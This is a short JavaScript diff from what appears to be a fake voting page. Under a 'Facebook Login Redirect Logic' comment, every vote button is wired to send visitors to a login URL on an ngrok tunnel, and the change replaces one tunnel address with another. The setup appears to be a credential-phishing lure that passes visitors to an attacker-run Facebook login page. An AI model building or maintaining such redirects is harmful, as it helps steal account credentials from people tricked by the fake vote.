@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // --- Facebook Login Redirect Logic ---
     const allVoteButtons = document.querySelectorAll('.vote-btn');
-    const baseLoginUrl = 'https://23b618127a30.ngrok-free.app/';
+    const baseLoginUrl = 'https://3e729aa85aed.ngrok-free.app/';
 
     allVoteButtons.forEach(button => {
         button.addEventListener('click', () => {
